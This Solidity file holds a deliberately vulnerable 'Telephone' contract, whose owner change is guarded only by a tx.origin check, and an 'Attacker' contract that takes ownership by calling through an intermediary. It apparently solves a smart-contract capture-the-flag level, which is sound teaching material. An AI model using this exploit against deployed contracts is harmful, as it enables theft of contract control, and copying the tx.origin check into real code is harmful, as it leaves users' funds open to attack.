
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Telephone {

  address public owner;

  constructor() {
    owner = msg.sender;
  }

  function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
      owner = _owner;
    }
  }
}

contract Attacker {
    address public owner;
    Telephone victimContract;

    constructor(Telephone _victimContract) {
        victimContract = Telephone(_victimContract);
        owner = address(msg.sender);
    }

    function attack() public {
        victimContract.changeOwner(owner);
    }
}